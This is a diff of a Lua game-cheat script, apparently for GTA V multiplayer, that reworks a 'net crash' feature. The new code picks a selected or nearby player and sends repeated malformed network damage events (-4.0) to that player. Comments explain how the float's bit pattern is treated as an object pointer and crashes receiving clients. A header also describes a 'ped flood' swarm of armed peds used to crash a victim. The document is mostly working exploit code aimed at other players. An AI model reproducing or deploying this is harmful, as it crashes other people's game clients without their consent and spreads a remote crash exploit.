@@ -19818,7 +19818,7 @@ local C = (function(O,E,S)
 --
 --   Ped flood   an armed networked swarm: 200 player-model peds with grenade
 --               launchers and sixty props around the victim, firing for 20 s
---   Net crash   the self -4.0 damage broadcast
+--   Net crash   -4.0 network damage on the selected player
 --
 -- The swarm is the proven vector from the reference corpus
 -- (AC/Nouveau/crasher_propsss.txt, v50). A passive clone ring does not crash a
@@ -22246,6 +22246,43 @@ local NET = (function(O, C)
         return okc
     end
 
+    -- The target picker for the crash lane. It does NOT use C.target: that
+    -- one is gated by PED.minDist (250 m), which is the operator-safe window
+    -- for the swarm. A crash target has to be streamed, so we take the player
+    -- selected in the menu first, then the closest active player under 200 m.
+    local function crashTarget()
+        local sid = (type(Menu) == "table") and Menu.SelectedPlayer or nil
+        if type(sid) == "number" then
+            local okP, p = pcall(GetPlayerFromServerId, sid)
+            if okP and type(p) == "number" and p >= 0 and p ~= PlayerId() then
+                local okPed, ped = pcall(GetPlayerPed, p)
+                if okPed and type(ped) == "number" and ped ~= 0 and DoesEntityExist(ped) then
+                    return ped, sid
+                end
+            end
+        end
+        local me = PlayerPedId()
+        local my = GetEntityCoords(me)
+        if type(my) ~= "table" and type(my) ~= "vector3" and type(my) ~= "userdata" then
+            return nil
+        end
+        local best, bestD = nil, 200.0
+        for _, p in ipairs(GetActivePlayers()) do
+            if p ~= PlayerId() then
+                local ped = GetPlayerPed(p)
+                if DoesEntityExist(ped) then
+                    local c = GetEntityCoords(ped)
+                    local dx = (c.x or 0) - (my.x or 0)
+                    local dy = (c.y or 0) - (my.y or 0)
+                    local dz = (c.z or 0) - (my.z or 0)
+                    local d = math.sqrt(dx * dx + dy * dy + dz * dz)
+                    if d < bestD then best, bestD = ped, d end
+                end
+            end
+        end
+        return best
+    end
+
     function NET.crash()
         local stamp = GetGameTimer()
         if NET.crashAt and stamp - NET.crashAt < 4000 then
@@ -22253,61 +22290,70 @@ local NET = (function(O, C)
             return false
         end
         NET.crashAt = stamp
-        if type(Susano) ~= "table" or type(Susano.SendNetworkDamage) ~= "function" then
-            O.log("net crash: SendNetworkDamage unavailable")
-            netToast("Net crash: primitive unavailable")
-            return false
-        end
         local me = PlayerPedId()
         if type(me) ~= "number" or me == 0 then
             O.log("net crash: no local ped")
             netToast("Net crash: no local ped")
             return false
         end
-        local c = GetEntityCoords(me)
-        if type(c) ~= "vector3" and type(c) ~= "table" then
-            O.log("net crash: no coords")
+        local ped = crashTarget()
+        if type(ped) ~= "number" or ped == 0 then
+            O.log("net crash: no target in 200 m (select a player)")
+            netToast("Net crash: select a player")
             return false
         end
+        local c = GetEntityCoords(ped)
+        local x, y, z = c.x or 0, c.y or 0, c.z or 0
 
-        O.log("net crash: self -4.0 broadcast")
-        netToast("Net crash: self -4.0 broadcast")
+        O.log("net crash: ped %s", tostring(ped))
+        netToast("Net crash: sending")
 
-        -- What the dump proves: the receiver faults in
-        --   or word ptr [rax+214h], 20h
-        -- with rax = 0xC0800000, which is exactly the float -4.0. That slot is
-        -- a refcounted weapon/attachment (refcount +0x210, flags +0x214,
-        -- virtual release through [rax]), so GTA took the damage float from a
-        -- network weaponDamageEvent and used its raw bits as an object pointer
-        -- before releasing it. Nothing in the server event layer validates the
-        -- damage field, so -4.0 reaches every client in scope.
-        --
-        -- The event is self-sourced: source == target == the local ped. The
-        -- server accepts it because the source is the sender's own ped, and it
-        -- broadcasts it to every client that has the ped in scope. Each of
-        -- those clients applies -4.0 to the networked ped and dies in the
-        -- release above. The sender dies too, which is why the attacker in the
-        -- report collapsed forward instantly and then went down with everyone.
-        local variants = {
-            { dmg = -4.0, wpn = 0, flags = 0 },
-            { dmg = -4.0, wpn = 0, flags = 1 },
-            { dmg = -4.0, wpn = 0, flags = 512 },
-            { dmg = -4.0, wpn = 0, flags = 4096 },
-            { dmg = -4.0, wpn = 0, flags = 0, hc = 0, arh = 0, ari = 0 },
-        }
+        -- The dump proves the payload: or word ptr [rax+214h], 20h with
+        -- rax = 0xC0800000, the bit pattern of float -4.0. The receiver frees
+        -- a refcounted weapon/attachment whose pointer is that damage float.
+        -- The documented, working call is source == local ped, target ==
+        -- victim (a self-source event is not what the server forwards).
+        -- We try Susano first, then the GTA native fallback.
+        local APPLY_DAMAGE_TO_PED = 0x6B1E8E2ED1335B71
+        local WEAPON_RUNOVER = 133987706
 
         Citizen.CreateThread(function()
-            local hits = 0
-            for i = 1, 16 do
-                local v = variants[(i - 1) % #variants + 1]
-                local ok = pcall(Susano.SendNetworkDamage, me, me,
-                    c.x, c.y, c.z, v.dmg, v.wpn or 0, v.flags or 0,
-                    v.arh or 0, v.ari or 0, 0, v.hc or 0)
-                if ok then hits = hits + 1 end
+            local sent, err1 = 0, nil
+            -- pass 1: the exact documented call, six arguments only. Passing
+            -- the optional tail is what most bindings reject.
+            if type(Susano) == "table" and type(Susano.SendNetworkDamage) == "function" then
+                for i = 1, 8 do
+                    local ok, err = pcall(Susano.SendNetworkDamage, me, ped, x, y, z, -4.0)
+                    if ok then sent = sent + 1 else err1 = err end
+                    Citizen.Wait(60)
+                end
+            else
+                err1 = "Susano.SendNetworkDamage missing"
+            end
+            O.log("net crash: susano %d/8 err=%s", sent, tostring(err1))
+            if err1 then print(("[net crash] susano error: %s"):format(tostring(err1))) end
+            netToast(("Net crash: susano %d/8"):format(sent))
+
+            -- pass 2: a few more with the source spoiled to the ped itself,
+            -- in case this server only forwards self-attributed events.
+            if type(Susano) == "table" and type(Susano.SendNetworkDamage) == "function" then
+                for i = 1, 4 do
+                    local ok, err = pcall(Susano.SendNetworkDamage, ped, ped, x, y, z, -4.0)
+                    if not ok and err then print(("[net crash] self error: %s"):format(tostring(err))) end
+                    Citizen.Wait(60)
+                end
+            end
+
+            -- pass 3: GTA native fallback. Local application, but it runs the
+            -- same damage resolver and weapon-object path the dump faults in.
+            local native = 0
+            for i = 1, 8 do
+                local ok = pcall(APPLY_DAMAGE_TO_PED, ped, -4, false, WEAPON_RUNOVER, false)
+                if ok then native = native + 1 end
                 Citizen.Wait(60)
             end
-            O.log("net crash: %d/16 self -4.0 events sent", hits)
-            netToast(("Net crash: %d/16 self -4.0 events"):format(hits))
+            O.log("net crash: native %d/8", native)
+            netToast(("Net crash: native %d/8"):format(native))
         end)
         return true
     end
